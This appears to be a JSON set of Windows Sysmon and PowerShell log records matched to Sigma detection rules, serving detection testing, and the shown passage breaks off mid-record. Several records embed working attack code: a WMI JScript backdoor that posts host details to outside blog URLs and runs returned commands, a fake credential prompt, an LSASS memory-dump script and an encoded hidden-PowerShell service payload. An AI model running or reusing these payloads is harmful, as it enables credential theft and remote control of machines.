[
  {
    "Rule level": "high",
    "title": "Suspicious Scripting in a WMI Consumer",
    "sigma_yml": "sysmon_wmi_susp_scripting.yml",
    "description": "Detects suspicious commands that are related to scripting/powershell in WMI Event Consumers",
    "row_id": 32296,
    "ProcessId": 1828,
    "UtcTime": "2019-04-03 18:11:54.178",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Computer": "PC04.example.corp",
    "EventID": 20,
    "EventRecordID": 7195,
    "ThreadID": 3164,
    "Keywords": "0x8000000000000000",
    "Level": 4,
    "Opcode": 0,
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
    "Provider_Name": "Microsoft-Windows-Sysmon",
    "UserID": "S-1-5-18",
    "Task": 20,
    "SystemTime": "2019-04-03T18:11:54.178467Z",
    "Version": 3,
    "OriginalLogfile": "wmighost_sysmon_20_21_1.evtx-2L1E9MYP.json",
    "EventType": "WmiConsumerEvent",
    "User": "PC04\\IEUser",
    "Name": " \"ProbeScriptFint\"",
    "Destination": " \"var sXmlUrl=\\\"http://kumardeep.sosblogs.com/The-first-blog-b1/RSS-b1-rss2-posts.htm;http://blogs.rediff.com/anilchopra/feed/;http://www.blogster.com/kapoorsunil09/profile/rss\\\";var sOwner='XDD';var MAIN=function(){$=this;$.key='W';$.sFeedUrl=sXmlUrl;$.sOwner=sOwner;$.sXmlUrl='';$.oHttp=null;$.oShell=null;$.oStream=null;$.sHostName=null;$.sOSType=null;$.sMacAddress=null;$.sURLParam=null;$.version='2.0.0';$.runtime=5000;$.oWMI=null;$._x=ActiveXObject;};MAIN.prototype={InitObjects:function(){$.oWMI=GetObject('winmgmts:{impersonationLevel=impersonate}!\\\\\\\\\\\\\\\\.\\\\\\\\root\\\\\\\\cimv2');$.oShell=new $._x('WScript.Shell');$.oStream=new $._x('ADODB.Stream');$.GetOSInfo();$.GetMacAddress();$.GenerateUrlParam();},WMI:function(sql){return $.oWMI.ExecQuery(sql);},GetOSInfo:function(){var e=new Enumerator($.WMI('Select * from Win32_OperatingSystem'));if(!e.atEnd()){var item=e.item();$.sOSType=item.Caption+item.ServicePackMajorVersion;$.sHostName=item.CSName;}},GetMacAddress:function(){var e=new Enumerator($.WMI('Select * from Win32_NetworkAdapter where PNPDeviceID like \\\\\\\"%PCI%\\\\\\\" and NetConnectionStatus=2'));if(!e.atEnd()){$.sMacAddress=e.item().MACAddress;}},GenerateUrlParam:function(){var time=new Date();$.sURLParam='cstype=server&authname=servername&authpass=serverpass&hostname='+$.sHostName+'&ostype='+$.sOSType+'&macaddr='+$.sMacAddress+'&owner='+$.sOwner+'&version='+$.version+'&runtime='+$.runtime;$.sURLParam+='&t='+time.getMinutes()+time.getSeconds();},CleanObjects:function(){$.oShell=null;$.oStream=null;var e=new Enumerator($.WMI('Select * from Win32_Process where Name=\\\\\\\"scrcons.exe\\\\\\\"'));while(!e.atEnd()){e.item().terminate();e.moveNext();}},Decode:function(sourceStr){var keycode=sourceStr.charCodeAt(0);var source=sourceStr.substr(1);var vals=source.split(',');var result='';for(var i=0;i<vals.length;i++){result+=String.fromCharCode(vals[i]^keycode);}return result;},circleDecode:function(sc){var base=sc.charCodeAt(0);var s=base-32;var r='';for(var i=1;i<sc.length;i++){var nc=sc.charCodeAt(i)-s-i+1;if(nc<32){nc=126+(nc-32)%94;}r+=String.fromCharCode(nc);}return r;},MainLoop:function(){$.oHttp=new $._x('Microsoft.XmlHttp');var feedUrlArry=$.sFeedUrl.split(';');var start=new Date();var oXml=new ActiveXObject('MSXML2.DOMDocument.3.0');for(var n=0;n<feedUrlArry.length;n++){var UrlList=new Array();var URLnum=0;try{var tstr=feedUrlArry[n].match('http://.*?\\\\\\\\.php');if(tstr!=null){UrlList[URLnum++]=tstr;}else{$.oHttp.Open('GET',feedUrlArry[n],false);$.oHttp.setRequestHeader('User-Agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.9.1) Gecko/20090624 Firefox/3.5');$.oHttp.Send();var response=$.oHttp.ResponseText.replace(/(^\\\\s*)|(\\\\s*$)/g,'');var re=/<title>@(.*)@<\\\\/title>+/g;var titleList=response.match(re);for(var i=0;i<titleList.length;i++){try{oXml.loadXML(titleList[i]);var container=oXml.getElementsByTagName('title');var tmpstr=container[0].text.match('@(.*)@');UrlList[URLnum++]=$.circleDecode(tmpstr[1]);}catch(e){}}}for(var Urlindex=0;Urlindex<UrlList.length;Urlindex++){$.sXmlUrl=UrlList[Urlindex];var runnum=360;while(runnum-->0){$.oHttp.Open('POST',$.sXmlUrl,false);$.oHttp.setRequestHeader('CONTENT-TYPE','application/x-www-form-urlencoded');$.oHttp.Send($.sURLParam);var response=$.oHttp.ResponseText.replace(/(^\\\\s*)|(\\\\s*$)/g,'');if(response.length>0){var commands=null;var container;try{oXml.loadXML(response);container=oXml.getElementsByTagName('div');for(var i=0;i<container.length;i++){if(container[i].getAttribute('id')=='0a552b5a4352'){commands=eval('('+container[i].text+')').command;}}}catch(e){}if(commands!=null){var commandresult='';for(var i=0;i<commands.length;i++){var result='no response';try{result=eval($.Decode(commands[i].value));}catch(e){}if(i>0){commandresult+=',';}commandresult+='\\\\''+commands[i].id+'\\\\':\\\\''+escape(result)+'\\\\'';}if(commandresult.length>0){commandresult='{'+commandresult+'}';$.oHttp.Open('POST',$.sXmlUrl,false);$.oHttp.setRequestHeader('CONTENT-TYPE','application/x-www-form-urlencoded');$.oHttp.Send($.sURLParam+'&command=result&commandresult='+commandresult);}}else{$.sXmlUrl='';runnum=0;}}$.runtime=(new Date()).getTime()-start.getTime();WScript.Sleep(10000);}if($.sXmlUrl.length>0){return;}}}catch(e){}}},Fire:function(){$.InitObjects();try{$.MainLoop();}catch(e){}$.CleanObjects();}};new MAIN().Fire();\"",
    "Operation": "Modified",
    "Type": "Script"
  },
  {
    "Rule level": "high",
    "title": "PowerShell Credential Prompt",
    "sigma_yml": "posh_ps_prompt_credentials.yml",
    "description": "Detects PowerShell calling a credential prompt",
    "row_id": 33358,
    "ProcessId": 5500,
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "MSEDGEWIN10",
    "EventID": 4104,
    "EventRecordID": 1123,
    "ThreadID": 356,
    "Keywords": "0x0",
    "Level": 3,
    "Opcode": 15,
    "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A",
    "Provider_Name": "Microsoft-Windows-PowerShell",
    "UserID": "S-1-5-21-3461203602-4096304019-2269080069-1000",
    "Task": 2,
    "SystemTime": "2019-09-09T13:35:09.315230Z",
    "Version": 1,
    "OriginalLogfile": "phish_windows_credentials_powershell_scriptblockLog_4104.evtx-N48P5T0I.json",
    "ActivityID": "B5ABE6C2-675C-0001-A601-ACB55C67D501",
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockId": "c7ca7056-b317-4fff-b796-05d8ef896dcd",
    "ScriptBlockText": "function Invoke-LoginPrompt{\n$cred = $Host.ui.PromptForCredential(\"Windows Security\", \"Please enter user credentials\", \"$env:userdomain\\$env:username\",\"\")\n$username = \"$env:username\"\n$domain = \"$env:userdomain\"\n$full = \"$domain\" + \"\\\" + \"$username\"\n$password = $cred.GetNetworkCredential().password\nAdd-Type -assemblyname System.DirectoryServices.AccountManagement\n$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)\nwhile($DS.ValidateCredentials(\"$full\",\"$password\") -ne $True){\n    $cred = $Host.ui.PromptForCredential(\"Windows Security\", \"Invalid Credentials, Please try again\", \"$env:userdomain\\$env:username\",\"\")\n    $username = \"$env:username\"\n    $domain = \"$env:userdomain\"\n    $full = \"$domain\" + \"\\\" + \"$username\"\n    $password = $cred.GetNetworkCredential().password\n    Add-Type -assemblyname System.DirectoryServices.AccountManagement\n    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)\n    $DS.ValidateCredentials(\"$full\", \"$password\") | out-null\n    }\n $output = $newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password\n $output\n R{START_PROCESS}\n}\nInvoke-LoginPrompt"
  },
  {
    "Rule level": "high",
    "title": "Accessing WinAPI in PowerShell",
    "sigma_yml": "posh_ps_accessing_win_api.yml",
    "description": "Detecting use WinAPI Functions in PowerShell",
    "row_id": 35488,
    "ProcessId": 7008,
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "MSEDGEWIN10",
    "EventID": 4104,
    "EventRecordID": 971,
    "ThreadID": 6488,
    "Keywords": "0x0",
    "Level": 3,
    "Opcode": 15,
    "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A",
    "Provider_Name": "Microsoft-Windows-PowerShell",
    "UserID": "S-1-5-21-3461203602-4096304019-2269080069-1000",
    "Task": 2,
    "SystemTime": "2020-06-30T14:24:08.254605Z",
    "Version": 1,
    "OriginalLogfile": "Powershell_4104_MiniDumpWriteDump_Lsass.evtx-EAZ88PUE.json",
    "ActivityID": "4AA5EAE3-4F33-0001-3A2B-A64A334FD601",
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockId": "27f08bda-c330-419f-b83b-eb5c0f699930",
    "ScriptBlockText": "function Memory($path)\r\n{\r\n\t\t\t  \r\n\t\t\t  \r\n\t\t$Process = Get-Process lsass\r\n\t\t$DumpFilePath = $path\r\n\t\t\r\n\t\t$WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')\r\n\t\t$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')\r\n\t\t$Flags = [Reflection.BindingFlags] 'NonPublic, Static'\r\n\t\t$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)\r\n\t\t$MiniDumpWithFullMemory = [UInt32] 2\r\n\t\r\n\t\t\t\r\n\t\t\t  #\r\n\t\t$ProcessId = $Process.Id\r\n\t\t$ProcessName = $Process.Name\r\n\t\t$ProcessHandle = $Process.Handle\r\n\t\t$ProcessFileName = \"$($ProcessName).dmp\"\r\n\t\t\r\n\t\t$ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName\r\n\t\t\r\n\t\t$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)\r\n\t\t\t  \r\n\t\t$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t$ProcessId,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t$FileStream.SafeFileHandle,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t$MiniDumpWithFullMemory,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero))\r\n\t\t\t  \r\n\t\t$FileStream.Close()\r\n\t\t\r\n\t\tif (-not $Result)\r\n\t\t{\r\n\t\t\t$Exception = New-Object ComponentModel.Win32Exception\r\n\t\t\t$ExceptionMessage = \"$($Exception.Message) ($($ProcessName):$($ProcessId))\"\r\n\t\t\t\r\n\t\t\t# Remove any partially written dump files. For example, a partial dump will be written\r\n\t\t\t# in the case when 32-bit PowerShell tries to dump a 64-bit process.\r\n\t\t\tRemove-Item $ProcessDumpPath -ErrorAction SilentlyContinue\r\n\t\t\t\r\n\t\t\tthrow $ExceptionMessage\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\t\"Memdump complete!\"\r\n\t\t}\r\n\t\r\n}",
    "Path": "C:\\Users\\Public\\lsass_wer_ps.ps1"
  },
  {
    "Rule level": "high",
    "title": "Malicious PowerShell Keywords",
    "sigma_yml": "posh_ps_malicious_keywords.yml",
    "description": "Detects keywords from well-known PowerShell exploitation frameworks",
    "row_id": 35488,
    "ProcessId": 7008,
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "MSEDGEWIN10",
    "EventID": 4104,
    "EventRecordID": 971,
    "ThreadID": 6488,
    "Keywords": "0x0",
    "Level": 3,
    "Opcode": 15,
    "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A",
    "Provider_Name": "Microsoft-Windows-PowerShell",
    "UserID": "S-1-5-21-3461203602-4096304019-2269080069-1000",
    "Task": 2,
    "SystemTime": "2020-06-30T14:24:08.254605Z",
    "Version": 1,
    "OriginalLogfile": "Powershell_4104_MiniDumpWriteDump_Lsass.evtx-EAZ88PUE.json",
    "ActivityID": "4AA5EAE3-4F33-0001-3A2B-A64A334FD601",
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockId": "27f08bda-c330-419f-b83b-eb5c0f699930",
    "ScriptBlockText": "function Memory($path)\r\n{\r\n\t\t\t  \r\n\t\t\t  \r\n\t\t$Process = Get-Process lsass\r\n\t\t$DumpFilePath = $path\r\n\t\t\r\n\t\t$WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')\r\n\t\t$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')\r\n\t\t$Flags = [Reflection.BindingFlags] 'NonPublic, Static'\r\n\t\t$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)\r\n\t\t$MiniDumpWithFullMemory = [UInt32] 2\r\n\t\r\n\t\t\t\r\n\t\t\t  #\r\n\t\t$ProcessId = $Process.Id\r\n\t\t$ProcessName = $Process.Name\r\n\t\t$ProcessHandle = $Process.Handle\r\n\t\t$ProcessFileName = \"$($ProcessName).dmp\"\r\n\t\t\r\n\t\t$ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName\r\n\t\t\r\n\t\t$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)\r\n\t\t\t  \r\n\t\t$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t$ProcessId,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t$FileStream.SafeFileHandle,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t$MiniDumpWithFullMemory,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero))\r\n\t\t\t  \r\n\t\t$FileStream.Close()\r\n\t\t\r\n\t\tif (-not $Result)\r\n\t\t{\r\n\t\t\t$Exception = New-Object ComponentModel.Win32Exception\r\n\t\t\t$ExceptionMessage = \"$($Exception.Message) ($($ProcessName):$($ProcessId))\"\r\n\t\t\t\r\n\t\t\t# Remove any partially written dump files. For example, a partial dump will be written\r\n\t\t\t# in the case when 32-bit PowerShell tries to dump a 64-bit process.\r\n\t\t\tRemove-Item $ProcessDumpPath -ErrorAction SilentlyContinue\r\n\t\t\t\r\n\t\t\tthrow $ExceptionMessage\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\t\"Memdump complete!\"\r\n\t\t}\r\n\t\r\n}",
    "Path": "C:\\Users\\Public\\lsass_wer_ps.ps1"
  },
  {
    "Rule level": "high",
    "title": "Direct Syscall of NtOpenProcess",
    "sigma_yml": "proc_access_win_direct_syscall_ntopenprocess.yml",
    "description": "Detects the usage of the direct syscall of NtOpenProcess which might be done from a CobaltStrike BOF.",
    "row_id": 34560,
    "ProcessId": 3248,
    "UtcTime": "2020-06-30 20:50:25.539",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Computer": "MSEDGEWIN10",
    "EventID": 10,
    "EventRecordID": 303867,
    "ThreadID": 4128,
    "Keywords": "0x8000000000000000",
    "Level": 4,
    "Opcode": 0,
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
    "Provider_Name": "Microsoft-Windows-Sysmon",
    "UserID": "S-1-5-18",
    "Task": 10,
    "SystemTime": "2020-06-30T20:50:25.546713Z",
    "Version": 3,
    "OriginalLogfile": "Sysmon_10_Evasion_Suspicious_NtOpenProcess_CallTrace.evtx-FP0WG2ER.json",
    "CallTrace": "UNKNOWN(000001F3C35A0014)",
    "GrantedAccess": "0x1fffff",
    "SourceImage": "C:\\Users\\Public\\za3bollo.exe",
    "SourceProcessGUID": "747F3D96-A591-5EFB-0000-00109FE4CC01",
    "SourceProcessId": 1972,
    "SourceThreadId": 7192,
    "TargetImage": "C:\\Windows\\system32\\notepad.exe",
    "TargetProcessGUID": "747F3D96-59BB-5EFB-0000-0010D81B6400",
    "TargetProcessId": 2996,
    "RuleName": "Evasion Suspicious NtOpenProcess Call"
  },
  {
    "Rule level": "critical",
    "title": "CobaltStrike Service Installations in Registry",
    "sigma_yml": "registry_set_cobaltstrike_service_installs.yml",
    "description": "Detects known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement. We can also catch this by system log 7045 (https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/win_cobaltstrike_service_installs.yml) In some SIEM you can catch those events also in HKLM\\System\\ControlSet001\\Services or HKLM\\System\\ControlSet002\\Services, however, this rule is based on a regular sysmon's events.",
    "row_id": 35910,
    "Image": "C:\\Windows\\system32\\services.exe",
    "ProcessGuid": "365ABB72-2586-5CC9-0000-0010DC530000",
    "ProcessId": 1964,
    "UtcTime": "2019-04-30 20:26:51.934",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Computer": "IEWIN7",
    "EventID": 13,
    "EventRecordID": 9806,
    "ThreadID": 1664,
    "Keywords": "0x8000000000000000",
    "Level": 4,
    "Opcode": 0,
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
    "Provider_Name": "Microsoft-Windows-Sysmon",
    "UserID": "S-1-5-18",
    "Task": 13,
    "SystemTime": "2019-04-30T20:26:51.981089Z",
    "Version": 2,
    "OriginalLogfile": "LM_sysmon_psexec_smb_meterpreter.evtx-7IOZ83SP.json",
    "Details": "%%COMSPEC%% /b /c start /b /min powershell.exe -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAIuvyFwCA7VW+2/aSBD+OZH6P1gVErZCMA60aSJVujVPE5xADITHodNir+0lay/Ya169/u83Btym1/SuPeksHruzM7Mz33w7azcJbUF5KM2DxU1J+vTm/KyLIxxIco6MClKOmsrZGQhz5Er6KMlTtFzWeIBpOLu9rSZRREJxnBebRKA4JsGcURLLivSn9OSTiFw+zBfEFtInKfdHscn4HLOT2q6KbZ9Ilyh00rUOt3EaSdFaMirk/O+/55XppTYr1lcJZrGct3axIEHRYSyvSJ+VdMP+bknkvEntiMfcFcUnGpavioMwxi65B29rYhLhcyfOK5ADfCIikiiUIJvU/Lgo52HYjbiNHCcicZwvSNPU8XQ2+02ennZ9TEJBA1I0QkEivrRItKY2iYstHDqMPBJ3BlaWiGjozRQF1Nb8mci5MGGsIP2KG/mebDLMftZIfmkEWl0RKYW0gn/P0uROwsjRLv9KmFBzBZ5j3QGyz2/O35y7GUVWdyP6kiEwOpsexgQCk7s8pge9j1KpIJmwCRY82sE0148Sosy+wCrl3Gbhx9ZapgqKfP+0BdF0yKkzA5NTHXMbkUp/zMYacWlIarsQB9TOCCe/Bi5xGTnkV8zU7iEkOX9aIE6NMOJhkQKW1vg7s3pAxRdbPaHMIRGyoUAxRAW1U74N5lgDOW+EJgkAn+McSJdzgeYk0z5Re5ftns5BKV9lOI4LUjeBc2YXJItgRpyChMKYnpZQIvhhmP8arpkwQW0ci8zdTDmieNqtysNYRIkNBYPM+9aS2BSzFIiC1KIO0XcW9bJd86/CUMWMAfvB0xrKAJI0fUukNIicNLumUrSIMIIlIwFoHA57g2EPjvaJ4QfWYI84+W+jyxh8pGuKQpb+i9igtBbjoiANaSSgY6SIpuz5L1u/6BQQRDUipwLI2ZmY6juRMjm3H6c8PKFxyD0SkHcj4oGOY/K+cuwJ8lv1gVYRPGMjZKatP1MNbahmmPAd0LLBa9fOXXvRUqPa1neRERtmq1vrtVqVddsaVoRVN8Rd1xBmfbRYWKj1OBiLiYFafVp6Hlf2yzbdWx3kjLfq+72+35T07X7hOe645rretWs9au8atPNU7emlK9yp1ZPOk77RS5W4TjetHh30ntsNMR8PGR64qjfSbjDddqLFUOPm3kCo6ZftfdsdNn3T2Y1blCzUUof2UA+hO/txMGh6S68ZI/VmuKoG3h1CRh8jA9WHu/Y7pvcGDR0N6noPP/Bu+aKmahNnVW9MRrgdMKfZUrXxCDkoUvuer10/+GGKE/b0lZ7qoM5k11BBp1tBrcoV3U9WvaaH6qAzDDjCDfo8uBiBz/s+2DwNNIcjERojVR16qodcyx9jpIO2vkINnVd3H7pmVx0Or3xt/qz5EDMZrT+YbXTRsLuqql4Ec/hVkW0ut+FI31yvvZbF7/AdHq4nZVXrb5ouWqGLC13T56JVL7fXsG9fvRl8fJtyB8iTc/f+5AUvftTATRzFPmbAF+jN2cls8Khx6rhdTlMLWT5ezs8kCgmDCw6uwIzliDFup83+0Jzhojm2//Q2GsCwfPXqSJG+KCpfr4FMdHs7gTDh3OzHxQ4JPeEXSttyqQRdvbStlCDJn0+sypc7GRwV0jvhgMvRLzv4VdKzlPMfh1Hlf4brdIZ9+HP+Da6vsn9Y/SkIS4Vjyt+JvxX8EqK/nvsTpgJULehDjBxvv9chOJHjxYvBoTRQfff0pK91D4m4vIcXhjfnfwFhhx3MPQoAAA==''))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\"",
    "EventType": "SetValue",
    "TargetObject": "HKLM\\System\\CurrentControlSet\\services\\hello\\ImagePath"
  },
  {
    "Rule level": "high",
    "title": "PowerShell as a Service in Registry",
    "sigma_yml": "registry_set_powershell_as_service.yml",
    "description": "Detects that a powershell code is written to the registry as a service.",
    "row_id": 35910,
    "Image": "C:\\Windows\\system32\\services.exe",
    "ProcessGuid": "365ABB72-2586-5CC9-0000-0010DC530000",
    "ProcessId": 1964,
    "UtcTime": "2019-04-30 20:26:51.934",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Computer": "IEWIN7",
    "EventID": 13,
    "EventRecordID": 9806,
    "ThreadID": 1664,
    "Keywords": "0x8000000000000000",
    "Level": 4,
    "Opcode": 0,
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
    "Provider_Name": "Microsoft-Windows-Sysmon",
    "UserID": "S-1-5-18",
    "Task": 13,
    "SystemTime": "2019-04-30T20:26:51.981089Z",
    "Version": 2,
    "OriginalLogfile": "LM_sysmon_psexec_smb_meterpreter.evtx-7IOZ83SP.json",
    "Details": "%%COMSPEC%% /b /c start /b /min powershell.exe -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAIuvyFwCA7VW+2/aSBD+OZH6P1gVErZCMA60aSJVujVPE5xADITHodNir+0lay/Ya169/u83Btym1/SuPeksHruzM7Mz33w7azcJbUF5KM2DxU1J+vTm/KyLIxxIco6MClKOmsrZGQhz5Er6KMlTtFzWeIBpOLu9rSZRREJxnBebRKA4JsGcURLLivSn9OSTiFw+zBfEFtInKfdHscn4HLOT2q6KbZ9Ilyh00rUOt3EaSdFaMirk/O+/55XppTYr1lcJZrGct3axIEHRYSyvSJ+VdMP+bknkvEntiMfcFcUnGpavioMwxi65B29rYhLhcyfOK5ADfCIikiiUIJvU/Lgo52HYjbiNHCcicZwvSNPU8XQ2+02ennZ9TEJBA1I0QkEivrRItKY2iYstHDqMPBJ3BlaWiGjozRQF1Nb8mci5MGGsIP2KG/mebDLMftZIfmkEWl0RKYW0gn/P0uROwsjRLv9KmFBzBZ5j3QGyz2/O35y7GUVWdyP6kiEwOpsexgQCk7s8pge9j1KpIJmwCRY82sE0148Sosy+wCrl3Gbhx9ZapgqKfP+0BdF0yKkzA5NTHXMbkUp/zMYacWlIarsQB9TOCCe/Bi5xGTnkV8zU7iEkOX9aIE6NMOJhkQKW1vg7s3pAxRdbPaHMIRGyoUAxRAW1U74N5lgDOW+EJgkAn+McSJdzgeYk0z5Re5ftns5BKV9lOI4LUjeBc2YXJItgRpyChMKYnpZQIvhhmP8arpkwQW0ci8zdTDmieNqtysNYRIkNBYPM+9aS2BSzFIiC1KIO0XcW9bJd86/CUMWMAfvB0xrKAJI0fUukNIicNLumUrSIMIIlIwFoHA57g2EPjvaJ4QfWYI84+W+jyxh8pGuKQpb+i9igtBbjoiANaSSgY6SIpuz5L1u/6BQQRDUipwLI2ZmY6juRMjm3H6c8PKFxyD0SkHcj4oGOY/K+cuwJ8lv1gVYRPGMjZKatP1MNbahmmPAd0LLBa9fOXXvRUqPa1neRERtmq1vrtVqVddsaVoRVN8Rd1xBmfbRYWKj1OBiLiYFafVp6Hlf2yzbdWx3kjLfq+72+35T07X7hOe645rretWs9au8atPNU7emlK9yp1ZPOk77RS5W4TjetHh30ntsNMR8PGR64qjfSbjDddqLFUOPm3kCo6ZftfdsdNn3T2Y1blCzUUof2UA+hO/txMGh6S68ZI/VmuKoG3h1CRh8jA9WHu/Y7pvcGDR0N6noPP/Bu+aKmahNnVW9MRrgdMKfZUrXxCDkoUvuer10/+GGKE/b0lZ7qoM5k11BBp1tBrcoV3U9WvaaH6qAzDDjCDfo8uBiBz/s+2DwNNIcjERojVR16qodcyx9jpIO2vkINnVd3H7pmVx0Or3xt/qz5EDMZrT+YbXTRsLuqql4Ec/hVkW0ut+FI31yvvZbF7/AdHq4nZVXrb5ouWqGLC13T56JVL7fXsG9fvRl8fJtyB8iTc/f+5AUvftTATRzFPmbAF+jN2cls8Khx6rhdTlMLWT5ezs8kCgmDCw6uwIzliDFup83+0Jzhojm2//Q2GsCwfPXqSJG+KCpfr4FMdHs7gTDh3OzHxQ4JPeEXSttyqQRdvbStlCDJn0+sypc7GRwV0jvhgMvRLzv4VdKzlPMfh1Hlf4brdIZ9+HP+Da6vsn9Y/SkIS4Vjyt+JvxX8EqK/nvsTpgJULehDjBxvv9chOJHjxYvBoTRQfff0pK91D4m4vIcXhjfnfwFhhx3MPQoAAA==''))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\"",
    "EventType": "SetValue",
    "TargetObject": "HKLM\\System\\CurrentControlSet\\services\\hello\\ImagePath"
  },
  {
    "Rule level": "high",
    "title": "CMSTP Execution Registry Event",
    "sigma_yml": "registry_event_cmstp_execution_by_registry.yml",
    "description": "Detects various indicators of Microsoft Connection Manager Profile Installer execution",
    "row_id": 34436,
    "Image": "C:\\Windows\\system32\\DllHost.exe",
    "ProcessGuid": "365ABB72-0545-5CD7-0000-001078371F00",
    "ProcessId": 2008,
    "UtcTime": "2019-05-11 17:28:22.488",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Computer": "IEWIN7",
    "EventID": 13,
    "EventRecordID": 16039,
    "ThreadID": 1992,
    "Keywords": "0x8000000000000000",
    "Level": 4,
    "Opcode": 0,
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
    "Provider_Name": "Microsoft-Windows-Sysmon",
    "UserID": "S-1-5-18",
    "Task": 13,
    "SystemTime": "2019-05-11T17:28:22.598305Z",
    "Version": 2,
    "OriginalLogfile": "sysmon_1_13_11_cmstp_ini_uacbypass.evtx-OT5JF1R3.json",
    "Details": "C:\\ProgramData\\Microsoft\\Network\\Connections\\Cm",
    "EventType": "SetValue",
    "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\cmmgr32.exe\\ProfileInstallPath"
  },
  {
    "Rule level": "high",
    "title": "New Lolbin Process by Office Applications",
    "sigma_yml": "proc_creation_win_lolbins_by_office_applications.yml",
    "description": "This rule will monitor any office apps that spins up a new LOLBin process. This activity is pretty suspicious and should be investigated.",
    "row_id": 30305,
    "Image": "C:\\Windows\\SysWOW64\\rundll32.exe",
    "ProcessGuid": "747F3D96-D8E8-5F8A-0000-00102CEF7200",
    "ProcessId": 3500,
    "UtcTime": "2020-10-17 11:43:36.303",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Computer": "MSEDGEWIN10",
    "EventID": 1,
    "EventRecordID": 417079,
    "ThreadID": 4688,
    "Keywords": "0x8000000000000000",
    "Level": 4,
    "Opcode": 0,
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
    "Provider_Name": "Microsoft-Windows-Sysmon",
    "UserID": "S-1-5-18",
    "Task": 1,
    "SystemTime": "2020-10-17T11:43:36.306601Z",
    "Version": 5,
    "OriginalLogfile": "sideloading_uacbypass_rundll32_injection_c2.evtx-21VHW1WN.json",
    "CommandLine": "\"C:\\Windows\\System32\\rundll32.exe\"",
    "Company": "Microsoft Corporation",
    "CurrentDirectory": "C:\\Users\\IEUser\\AppData\\Roaming\\",
    "Description": "Windows host process (Rundll32)",
